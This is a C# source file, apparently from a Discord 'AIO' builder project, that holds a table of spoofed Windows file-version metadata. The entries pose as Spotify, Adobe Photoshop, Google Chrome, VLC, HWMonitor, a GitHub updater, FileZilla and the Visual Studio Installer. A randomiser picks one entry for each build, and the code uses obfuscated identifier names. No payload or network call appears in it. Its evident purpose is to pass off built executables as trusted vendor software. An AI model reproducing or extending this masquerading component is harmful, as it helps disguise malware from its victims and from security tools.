using System;
using System.Collections.Generic;
using System.Text;

namespace discord_aio_release
{
    internal class Metadata
    {
        public Metadata (RandomCharacters randomCharacters)
        {
            this.ranChars = randomCharacters;
        }

        private readonly List<FileMetadata> езл = new List<FileMetadata>
        {
            new FileMetadata
            {
                Title = "Spotify",
                Description = "Spotify",
                Product = "Spotify",
                Company = "Spotify Ltd",
                Copyright = "Copyright (c) 2023, Spotify Ltd",
                Trademark = "",
                MajorVersion = "1",
                MinorVersion = "2",
                BuildPart = "7",
                PrivatePart = "1277"
            },
            new FileMetadata
            {
                Title = "Photoshop",
                Description = "Adobe Photoshop 2020",
                Product = "Adobe Photoshop 2020",
                Company = "Adobe",
                Copyright = "© 1990-2019 Adobe. All rights reserved.",
                Trademark = "",
                MajorVersion = "21",
                MinorVersion = "0",
                BuildPart = "0",
                PrivatePart = "37"
            },
            new FileMetadata
            {
                Title = "chrome_exe",
                Description = "Google Chrome",
                Product = "Google Chrome",
                Company = "Google LLC",
                Copyright = "Copyright 2020 Google LLC. All rights reserved.",
                Trademark = "",
                MajorVersion = "89",
                MinorVersion = "0",
                BuildPart = "4389",
                PrivatePart = "90"
            },
            new FileMetadata
            {
                Title = "vlc",
                Description = "VLC media player",
                Product = "VLC media player",
                Company = "VideoLAN",
                Copyright = "Copyright © 1996-2018 VideoLAN and VLC Author",
                Trademark = "VLC media player, VideoLAN and x264 are registered trademarks from VideoLAN",
                MajorVersion = "3",
                MinorVersion = "0",
                BuildPart = "3",
                PrivatePart = "0"
            },
            new FileMetadata
            {
                Title = "HWMonitor.exe",
                Description = "HWMonitor",
                Product = "CPUID Hardware Monitor",
                Company = "CPUID",
                Copyright = "(c)2008-2018 CPUID.  All rights reserved.",
                Trademark = "",
                MajorVersion = "1",
                MinorVersion = "3",
                BuildPart = "4",
                PrivatePart = "0"
            },
            new FileMetadata
            {
                Title = "Update.exe",
                Description = "Update",
                Product = "Update",
                Company = "GitHub",
                Copyright = "Github",
                Trademark = "",
                MajorVersion = "1",
                MinorVersion = "1",
                BuildPart = "1",
                PrivatePart = "1"
            },
            new FileMetadata
            {
                Title = "FileZilla_3.58.0_win32-setup.exe",
                Description = "FileZilla FTP Client",
                Product = "FileZilla",
                Company = "Tim Kosse",
                Copyright = "Tim Kosse",
                Trademark = "",
                MajorVersion = "3",
                MinorVersion = "58",
                BuildPart = "0",
                PrivatePart = "0"
            },
            new FileMetadata
            {
                Title = "vs_community.exe",
                Description = "Visual Studio Installer",
                Product = "Microsoft Visual Studio",
                Company = "Microsoft Corporation",
                Copyright = "Microsoft Corporation",
                Trademark = "",
                MajorVersion = "17",
                MinorVersion = "1",
                BuildPart = "32210",
                PrivatePart = "32210"
            },
        };

        private readonly Random ran = new Random();
        private readonly RandomCharacters ranChars;
        private int hareo;
        public FileMetadata randomMetadata()
        {
            int num = this.hareo;
            do
            {
                num = this.ran.Next(0, this.езл.Count - 1);
            }
            while (num == this.hareo);
            this.hareo = num;
            return this.езл[num];
        }
    }

    public class RandomCharacters
    {
        public string getRandomCharacters(int length)
        {
            StringBuilder stringBuilder = new StringBuilder();
            for (int i = 1; i <= length; i++)
            {
                int index = this._random.Next(0, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".Length);
                stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"[index]);
            }
            return stringBuilder.ToString();
        }
        private readonly Random _random = new Random();
    }

    public class FileMetadata
    {
        public string Title { get; set; } = string.Empty;
        public string Description { get; set; } = string.Empty;
        public string Product { get; set; } = string.Empty;
        public string Company { get; set; } = string.Empty;
        public string Copyright { get; set; } = string.Empty;
        public string Trademark { get; set; } = string.Empty;
        public string MajorVersion { get; set; } = string.Empty;
        public string MinorVersion { get; set; } = string.Empty;
        public string BuildPart { get; set; } = string.Empty;
        public string PrivatePart { get; set; } = string.Empty;
    }
}